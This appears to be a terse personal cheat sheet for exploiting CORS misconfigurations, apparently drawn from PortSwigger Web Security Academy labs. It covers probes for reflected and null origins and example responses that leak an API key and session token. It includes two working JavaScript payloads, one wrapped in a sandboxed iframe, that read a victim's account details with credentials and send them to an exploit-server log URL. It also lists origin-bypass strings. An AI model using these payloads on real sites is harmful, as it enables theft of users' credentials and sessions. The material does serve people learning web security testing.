# CORS 

if you open two taps in your website { can this tab take info form next tab }   



(1)    you put in request:

Origin: http://0x-zero-day.github.io/

---------------------------------------------------

and if the response have :
 
-HTTP/2 200 OK 
- Access-Control-Allow-Origin: http://0x-zero-day.github.io/    <======  --important--
- Access-Control-Allow-Credentials: true                        <======  --important--
- Content-Type: application/json; charset=utf-8
- X-Frame-Options: SAMEORIGIN
- Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "ofnIfMYpkZFNT2hjTpYSaDtMjxHB3d3k",
  "sessions": [
    "Wqvgdu6rWtyhShoXzqeCmeqSHkyIAzW0"
  ]
} 


and if the data in response is sensitive so it a valid vuln  

------------------------------------------------------- 
after you found it you put this script to get all response 


<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>


============================================================

(1)    you put in request:

Origin: null



---------------------------------------------------

and if the response have :


HTTP/2 200 OK
Access-Control-Allow-Origin: null                   <====
Access-Control-Allow-Credentials: true              <====
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "kVwKPXJYdpCcNl8bZmYislrlblf3xAT8",
  "sessions": [
    "cZveYZ7ojyb8lIX4gsUHLACmTmKfYRat"
  ]
}

-----------------------------------------------------------
and if the data in response is sensitive so it a valid vuln  

------------------------------------------------------- 
after you found it you put this script to get all response 



<iframe sandbox="allow-scripts allow-same-origin allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ab7001704d5b2e081e51b930074007e.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0a2800320414b29681e01ab4010a0033.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>

--------------------------------------------------------

Access-Control-Allow-Origin: null                  
Access-Control-Allow-Credentials: true 
  

if this headers not appear when you write :        origin: hacker.com
 try:
hacker.com?.example.com
hacker.com%23@www.example.com 


